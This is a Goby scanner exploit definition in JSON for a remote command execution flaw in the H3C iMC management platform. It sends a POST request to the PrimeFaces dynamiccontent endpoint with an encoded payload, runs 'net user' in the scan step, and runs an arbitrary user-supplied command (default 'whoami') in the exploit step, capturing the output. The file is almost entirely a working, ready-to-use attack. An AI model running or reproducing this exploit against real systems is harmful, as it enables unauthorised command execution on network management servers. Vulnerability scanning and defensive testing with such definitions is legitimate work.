{
      "Name": "H3C IMC远程命令执行 h3c-imc",
      "Level": "3",
      "Tags": [],
      "GobyQuery": "product=\"H3C-iMC\"",
      "Description": "",
      "Product": "H3C iMC 智能管理中心平台",
      "Homepage": "http://www.h3c.com/cn/Products___Technology/Products/H3C_Soft/IT_Business/Resource/iMC_Flat",
      "Author": "ying",
      "Impact": "",
      "Recommandation": "",
      "References": [
            "https://www.t00ls.net/articles-60979.html"
      ],
	  "HasExp": true,
	  "ExpParams": [
		{
			"name": "Cmd",
			"type": "input",
			"value": "whoami",
			"show": ""
		}
	  ],
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/imc/javax.faces.resource/dynamiccontent.properties.xhtml",
                        "follow_redirect": true,
                        "header": {
                              "Content-Type": "application/x-www-form-urlencoded",
                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
                        },
                        "data_type": "text",
                        "data": "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=net user"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Administrator",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
		],
		"ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/imc/javax.faces.resource/dynamiccontent.properties.xhtml",
                        "follow_redirect": true,
                        "header": {
                              "Content-Type": "application/x-www-form-urlencoded",
                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
                        },
                        "data_type": "text",
                        "data": "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd={{{Cmd}}}"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Administrator",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
					"output|lastbody"
				  ]
            }
		],
      "PostTime": "2021-05-28 10:06:39",
      "GobyVersion": "1.8.268"
}